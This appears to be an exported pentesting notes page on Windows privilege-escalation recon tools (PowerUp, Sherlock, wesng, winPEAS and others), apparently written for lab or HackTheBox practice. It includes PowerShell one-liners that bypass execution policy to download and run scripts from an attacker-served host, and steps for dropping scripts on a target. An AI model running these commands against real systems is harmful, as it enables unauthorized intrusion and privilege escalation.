<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Recon Scripts</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Recon Scripts</h1></strong><br />There are scripts that will automate the information gathering process for you. <br />This is a huge saver of both time and effort.<br /><br />Do note that using scripts will probably generate a lot of noise. <br /><br /><strong><h2>## PowerUp.ps1</h2></strong><br /><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a><br /><br />PowerSploit&#39;s <code>PowerUp.ps1</code> is a powershell script that checks for low-hanging-fruit priv-escs<br />Run the <code>Invoke-AllChecks</code> function to check everything.<br /><br /><strong>Examples</strong><br />• hackthebox Querier<br /><br /><strong><h3>### How-to</h3></strong><br />1. Serve PowerUp.ps1 to target<br /><code>python -m SimpleHTTPServer</code><br /><br />2. Run PowerUp.ps1 with Invoke-AllChecks<br />CMD:<br /><code>powershell.exe -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.181:8000/PowerUp.ps1&#39;); Invoke-AllChecks&quot;</code><br /><br />PowerShell:<br /><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.181:8000/PowerUp.ps1&#39;); Invoke-AllChecks</code><br /><br /><strong><h2>## Sherlock and Watson</h2></strong><br />Sherlock and Watson, written by RastaMouse, check a Windows box for local priv-esc exploits.<br /><br /><strong><h3>### Sherlock.ps1</h3></strong><br /><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a><br />• Sherlock is for older systems.<br />• You&#39;ll want to run the <code>Find-AllVulns</code> function to check everything<br /><br /><code>wget -q https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</code><br /><br /><strong>#### How-to</strong><br />1. Serve Sherlock.ps1<br /><code>python -m SimpleHTTPServer</code><br /><br />2. Run Sherlock remotely<br />CMD:<br /><code>powershell.exe -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.181:8000/Sherlock.ps1&#39;); Find-AllVulns&quot;</code><br /><br />PowerShell:<br /><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.181:8000/Sherlock.ps1&#39;); Find-AllVulns</code><br /><br /><strong><h3>### Watson</h3></strong><br /><a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a><br />• Watson is for Windows 10, Server 2016 and Server 2019.<br />• You&#39;ve gotta compile it yourself<br /><br /><strong><h2>## WinSystemHelper</h2></strong><br /><a href="https://github.com/brianwrf/WinSystemHelper">https://github.com/brianwrf/WinSystemHelper</a><br /><br /><code>WinSystemHelper</code> checks for common exploits against a target system based intalled patches.<br />It&#39;s a <code>.bat</code> file.<br /><br /><code>explt2003.txt</code> is for Windows 2003 &amp; below<br /><code>expgt2003.txt</code> is for Windows 2003 &amp; above<br /><br /><code>wget -q https://raw.githubusercontent.com/brianwrf/WinSystemHelper/master/WinSysHelper.bat</code><br /><code>wget -q https://raw.githubusercontent.com/brianwrf/WinSystemHelper/master/explt2003.txt</code><br /><code>wget -q https://raw.githubusercontent.com/brianwrf/WinSystemHelper/master/expgt2003.txt</code><br /><br />1. Drop <code>WinSysHelper.bat</code>, <code>explt2003.txt</code> and <code>expgt2003.txt</code> to the target<br />2. Run <code>WinSysHelper.bat</code><br /><br /><strong><h2>## wesng</h2></strong><br /><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a><br /><code>wesng</code> stands for Windows Exploit Suggester - Next Generation.<br />It works for ALL Windows OSs.<br /><br /><code>wesng</code> reads the <code>systeminfo.txt</code> you give it, and checks the version, architecture and hotfixes against the Microsoft Security Bulletin database and find appropriate exploits for the system.<br /><br /><strong>1. Run </strong><strong><code>systeminfo</code></strong><strong> on the target</strong><br /><code>systeminfo</code><br /><br /><strong>2. Copy the output into a text file on your attacking machine</strong><br /><code>nano systeminfo.txt</code><br /><br /><strong>3. Run wesng</strong><br /><code>wes.py --update</code> - Might have to update first<br /><code>wes.py systeminfo.txt</code><br /><br />Show priv-esc exploits and ‘Critical’ ranked impacts<br /><code>wes.py systeminfo.txt -i Elevation of Privilege -s Critical</code><br /><br /><strong><h2>## Meterpreter&#39;s local_exploit_suggester</h2></strong><br /><code>local_exploit_suggester</code> will find suitable exploits for a target<br />It&#39;s reliable against 32-bit machines, but not 64-bit machines, and you have to be in a meterpreter shell.<br /><br />1. Background your meterpreter session<br /><code>Ctrl + Z</code><br /><br />2. Use the local_exploit_suggester module<br /><code>use post/multi/recon/local_exploit_suggester</code><br /><br />3. Point it at your meterpretre session and run it<br /><code>set SESSION 2</code><br /><code>run</code><br /><br /><strong><h2>## Powerless.bat</h2></strong><br /><a href="https://github.com/M4ximuss/Powerless">https://github.com/M4ximuss/Powerless</a><br />Powerless is a Windows privilege escalation/enumeration script designed for use wieth legacy Windows machines that don&#39;t have Powershell<br /><br /><strong><h2>## WindowsRoot.bat</h2></strong><br />JollyFrog - WindowsRoot.bat<br /><a href="https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md">https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md</a><br /><br />winPEAS<br /><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><br /><br />winPEAS offers 2 options for Windows:<br />• winPEAS.bat - Good if you can&#39;t run a compiled .exe<br />• winPEAS.exe - A C# binary which shouldn&#39;t need to use system commands, so you&#39;ll be able to run everything - requries .NET 4<br /><br /><strong><h2>## winPEAS.bat</h2></strong><br /><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><br /><br />winPEAS offers 2 options for Windows:<br />• <code>winPEAS.bat</code> - Good if you can&#39;t run a compiled .exe<br />• <code>winPEAS.exe</code> - A C# binary which shouldn&#39;t need to use system commands, so you&#39;ll be able to run everything - requries .NET 4<br /><br /><strong><h3>### Tips</h3></strong><br />• winPEAS has a huge output. If you&#39;re in an interactive console (where CTRL+C doesn&#39;t kill your shell) you can dump it to a log file<br />   ◇ <code>winPEAS.bat &gt; winpeas.log</code><br />   ◇ At the end of winPEAS it will bruteforce passwords, you can CTRL+C if you want<br /><br /></div>
</body>
</html>
